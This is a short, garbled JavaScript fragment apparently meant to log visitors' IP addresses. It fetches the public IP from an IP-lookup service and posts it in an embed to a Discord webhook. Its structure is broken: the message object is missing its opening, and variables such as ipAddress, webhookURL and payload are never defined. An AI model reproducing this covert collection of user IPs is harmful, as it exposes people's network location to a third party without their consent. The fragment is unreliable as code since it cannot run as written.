// Function to fetch the IP address and send it to the webhook
async function sendIPToDiscord() {
  try {

    const ipResponse = await fetch("https://api.ipify.org?format=json");
    const ipData = await ipResponse.json();

          description: `IP Address: \`${ipAddress}\``,
          color: 0x00ff00, // Green color for the embed

    await fetch(webhookURL, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(payload),
    });

    console.log("IP address sent to Discord webhook successfully!");
  } catch (error) {
    console.error("Error sending IP to Discord webhook:", error);
  }
}
